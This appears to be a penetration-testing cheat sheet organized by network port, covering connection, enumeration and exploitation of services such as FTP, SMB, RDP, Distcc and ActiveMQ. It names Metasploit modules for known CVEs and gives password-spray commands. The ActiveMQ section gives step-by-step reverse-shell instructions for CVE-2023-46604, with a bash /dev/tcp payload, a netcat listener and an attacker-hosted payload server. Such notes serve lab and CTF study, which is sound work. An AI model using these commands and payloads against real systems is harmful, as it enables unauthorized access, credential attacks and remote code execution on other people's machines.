# FTP (21)
## Connection
```bash
$ ftp <IP>
```
## Commands 
- ls
- get [FILE]
- mget [FILE] [FILE]
- put [FILE]
- exit
## Exploits
vsftpd 2.3.4 
- CVE-2011-2523 -> exploit/unix/ftp/vsftpd_234_backdoor (Metasploit)
	- Backdoor on port 6200

# SSH (22)
## General 
```bash
$ ssh <USER>@<IP>
```
## Options 
```bash
-p <PORT>
```
# SMB (139,445)
## SMB Shares Enumeration
```bash
$ smbmap -H <IP>
```
```bash
$ smbclient -L \\<IP>
```
## SMB Share Selection
```bash
$ smbclient  \\\\<IP>\\<SHARE>
```
### Commands
- **dir**: list files in current directory
- **more** <FILE>: see contents of file
- **get** <FILE>: download file to attacking device
- **cd**: change directory
- **put** <FILE>: upload file to target device

## Exploitation
### Samba
**Vulnerability**: Samba 3.0.20 < 3.0.25rc3 can be vulnerable to **CVE-2007-2447**, which allows remote code execution due to insufficient access control.
#### Exploitation using Metasploit
```bash
use exploit/multi/samba/usermap_script
set RHOSTS
set LHOST
```
# MQTT (1883)
Message Queuing Telemetry Transport 



# MariaDB (3306)
To connect to MariaDB, one can use the command mysql
## Display help
```bash
mysql --help
```
## Connect to Database (Passwordless)
```bash
mysql -h <TARGET_IP> -u root [--skip-ssl] [-P <PORT>]
```
## Commands
**Prints out the databases we can access**
```MariaDB
SHOW databases;
```
>[!NOTE]
> There are three default databases: **information_schema**, **mysql**, and **performance_schema**

**Select Database**
```MariaDB
USE <DATABASE>;          
```
**Prints out the available tables inside the current database**
```MariaDB
SHOW tables;
```
**Prints out all the data from the table {table_name}**
```MariaDB
SELECT * FROM <TABLE>;
```
# RDP (3389)
## Enumeration
### Automatic
```bash
$ nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```
It checks the available encryption and DoS vulnerability (without causing DoS to the service) and obtains NTLM Windows info (versions).
### Brute Force
	Be CAREFUL you might lock accounts 
### Password Sprays
	Be CAREFUL you might lock accounts 
#### Crowbar
https://github.com/galkan/crowbar
```bash
$ crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
#### hydra
```bash
$ hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```
	
## Connection
### xfreerdp
#### Fixed Screen:
```bash
$ xfreerdp /u:<USER> /p:<PASSWORD> /cert:ignore /v:10.10.73.136 /workarea /tls-seclevel:0
```
#### Adjustable Screen:
```bash
$ xfreerdp /u:admin /p:password /cert:ignore /v:10.10.15.71  /tls-seclevel:0 /smart-sizing
```
# Distcc (3632)
Distcc is a distributed compiler tool that speeds up compilation by offloading tasks to other networked systems running the `distccd` daemon.
## Exploitation
**Vulnerability**: Distcc can be vulnerable to **CVE-2004-2687**, which allows remote code execution due to insufficient access control.
### Test Exploit using Nmap
Nmap can be used to test the vulnerability by executing a command on the remote system, such as retrieving the `id` of the current user:
```bash
nmap -p 3632 <ip> --script distcc-cve2004-2687 --script-args="distcc-exec.cmd='id'"
```
### Exploitation with Metasploit
You can exploit this vulnerability using Metasploit:
```bash
use exploit/unix/misc/distcc_exec
```
# AMQP (5672)
Advanced Message Queuing Protocol

# Windows Remote Management (WinRM) using HTTP (5672)
WinRM is a Microsoft protocol that allows for remote management of Windows machines.
## Ex: Microsoft HTTPAPI httpd
Microsoft HTTPAPI (HTTP API) is a component of Windows that provides the underlying infrastructure for handling HTTP requests and responses. When referring to "httpd 2.0" in this context, it generally indicates a web server that uses HTTPAPI to handle web requests.
## Usage
```bash
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
```

# STOMP (61613, 61616)
Streaming Text Oriented Messaging Protocol

# ActiveMQ OpenWire Transport (61616)
Message Broker (like RabitMQ and Kafka). Written in Java and popular with Java Applications
## Exploitation
### CVE-2023-46604-RCE-Reverse-Shell-Apache-MQ
#### Option 1: Metasploit
#### Options 2: Github
1. Clone repository
2. Alter poc-linux.xml
```bash
<list>
	<value>bash</value>
	<value>-c</value>
	<value>bash -i >& /dev/tcp/IP/PORT 0>&1</value>
</list>
```
3. Entity Encode the bash command in poc-linux.xml
```bash
<list>
	<value>bash</value>
	<value>-c</value>
	<value>bash -i &#x3E;&#x26; /dev/tcp/IP/PORT 0&#x3E;&#x26;1</value>
</list>
```
```bash
<list>
	<value>bash</value>
	<value>-c</value>
	<value>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</value>
</list>
```
4. Start Http Server
```bash
sudo python3 -m http.server 80
```
5. Start Reverse Shell Listener
```bash
nc -lvnp 9001
```
6. Run Exploit
```bash
go run main.go -i TARGET_IP -p PORT=61616 -u http://ATTACKING_IP:80/poc-linux.xml
```
# Mystery Port
## Connection
```bash
$ nc <IP> <PORT>
```

